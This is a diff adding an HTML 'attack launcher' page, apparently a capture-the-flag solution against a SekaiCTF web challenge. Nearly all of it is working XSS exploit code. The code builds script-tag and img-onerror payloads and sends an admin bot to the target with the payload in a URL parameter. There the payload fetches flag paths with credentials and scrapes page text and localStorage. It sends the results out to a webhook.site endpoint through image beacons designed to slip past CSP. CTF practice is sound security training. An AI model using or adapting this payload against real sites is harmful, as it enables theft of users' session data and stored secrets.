@@ -1,0 +1,71 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>nbv attack launcher</title>
+  <meta name="referrer" content="no-referrer">
+  <style>body{font:14px/1.6 system-ui,Segoe UI,Arial;margin:2rem}code{background:#f6f8fa;padding:.2rem .4rem;border-radius:.3rem}</style>
+</head>
+<body>
+<h2>Launching…</h2>
+<p>This page will auto-redirect the admin bot into target with an XSS payload.</p>
+<script>
+/*** ←←← 只改这三项 ***/
+const TARGET_BASE = "https://nbv.chals.sekai.team/";   // 目标站
+const NOTE_PARAM  = "txt";                             // 入口参数名（不确定就试 note）
+const EXFIL_URL   = "https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac"; // 接收端
+
+// —— 下面是会在目标站上下文执行的代码 ——
+// 尽量用“内联可执行”的写法，尽量少依赖外部资源，避免 CSP 卡死。
+// 策略：依次尝试：/flag、/api/flag、DOM 文本、localStorage；
+// 拿到东西后用“打点图片”发回（<img src=…>），避免被 CSP 阻止 fetch 到外域。
+function buildVictimJS(exfil) {
+  return `(()=>{try{
+    const send=(d)=>{new Image().src='${exfil}?d='+encodeURIComponent(d)};
+    const sendE=(e)=>{new Image().src='${exfil}?e='+encodeURIComponent(e)};
+
+    const grabText = async (u)=>{ try{ let r=await fetch(u,{credentials:'include'}); if(r.ok){return await r.text()} }catch(_){ } return '' };
+
+    (async()=>{
+      let out='';
+      // 1) 常见路径
+      for (const p of ['/flag','/api/flag','/flag.txt']) {
+        if (out) break;
+        out = await grabText(p);
+        if (out && /SEKAI\\{|FLAG\\{|CTF/i.test(out)) { send('HIT '+p+' => '+out); return; }
+      }
+      // 2) 页内所有文本兜底
+      try {
+        const t = document.body && document.body.innerText || '';
+        if (t && /SEKAI\\{|FLAG\\{|CTF/i.test(t)) { send('DOM => '+t); return; }
+      } catch(_) {}
+      // 3) localStorage 兜底
+      try {
+        const ls = JSON.stringify(localStorage); 
+        if (ls) send('LS => '+ls);
+      } catch(_) {}
+
+      // 4) 没命中也上报一下页面信息
+      send('NO-HIT host='+location.host+' path='+location.pathname);
+    })();
+  }catch(e){ new Image().src='${exfil}?e='+encodeURIComponent('FATAL '+(e&&e.message)); }})();`;
+}
+
+// 一份 <script> 版本（常规情况下优先）
+const payloadScript = `<script>${buildVictimJS(EXFIL_URL)}<\/script>`;
+
+// 一份 <img onerror> 版本（有些站禁用 <script> 或 CSP 严一点时可试）
+const payloadImgOnErr = `<img src=x onerror="${buildVictimJS(EXFIL_URL).replace(/"/g,'&quot;')}">`;
+
+// 你可以二选一：先用 <script> 版，失败再换 onerror 版。
+const FINAL_PAYLOAD = payloadScript;
+
+// 拼出最终跳转 URL
+const u = new URL(TARGET_BASE);
+u.searchParams.set(NOTE_PARAM, FINAL_PAYLOAD);
+
+// 1 秒后跳转，给肉眼一个反应时间
+setTimeout(()=>{ location.href = u.toString(); }, 1000);
+</script>
+</body>
+</html>
